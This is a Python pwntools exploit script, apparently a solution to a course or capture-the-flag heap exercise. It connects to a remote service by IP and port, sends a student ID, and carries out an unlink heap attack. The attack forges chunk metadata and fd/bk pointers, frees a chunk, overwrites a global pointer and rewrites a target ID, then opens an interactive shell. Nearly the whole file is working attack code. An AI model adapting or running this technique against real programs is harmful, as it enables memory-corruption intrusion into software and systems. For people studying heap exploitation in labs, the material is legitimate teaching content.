from pwn import *
context.arch = 'amd64'
# context.log_level = 'debug'

sh = remote('47.99.80.189', 10031)  
sh.recvuntil("Please input your StudentID:\n")
sh.sendline('3180105507')

# allocate 3 chunks ABC
for i in range(3):
    sh.recvuntil("Your chocie:\n")
    sh.sendline('1')
    sh.recvuntil("please input the ddl time\n")
    sh.sendline('1')
    sh.recvuntil("please input the ddl content\n")
    sh.sendline('1')

# edit chunk A
sh.recvuntil("Your chocie:\n") 
sh.sendline('4')
sh.recvuntil("please input the ddl index\n") 
sh.sendline('1')
sh.recvuntil("please input the new ddl time\n") 
fd = 0x00000000006020E0-0x18
bk = 0x00000000006020E0-0x10
payload1 = b'\x00'*8 + p64(0x5f1) + p64(fd) + p64(bk)
sh.send(payload1) 
sh.recvuntil("please input the new ddl content\n") 
payload2 =b'\x00'*0x5d0 + p64(0x5f0) 
sh.sendline(payload2)  

# free B chunk
sh.recvuntil("Your chocie:\n") 
sh.sendline('2')  
sh.recvuntil("please input the ddl index\n") 
sh.sendline('2') 

# edit chunk A's time 
sh.recvuntil("Your chocie:\n") 
sh.sendline('4') 
sh.recvuntil("please input the ddl index\n") 
sh.sendline('1')
sh.recvuntil("please input the new ddl time\n")
# array[0]->TartargetID_addr
targetID_addr = 0x00000000006020C0
payload3 = 24 * b'\x00' + p64(targetID_addr)
sh.send(payload3) 
sh.recvuntil("please input the new ddl content\n") 
sh.sendline('1') 

# edit chunk A's time to targetID
sh.recvuntil("Your chocie:\n") 
sh.sendline('4') 
sh.recvuntil("please input the ddl index\n") 
sh.sendline('1')   
targetID = p64(3180105507)
sh.sendline(targetID)  
sh.recvuntil("please input the new ddl content\n") 
sh.sendline('1')  

# trigger check
sh.recvuntil("Your chocie:\n") 
sh.sendline('6')  

sh.recvuntil("Successfully change id to 3180105507\n") 
sh.sendline("./flag.exe 3180105507") 
sh.interactive()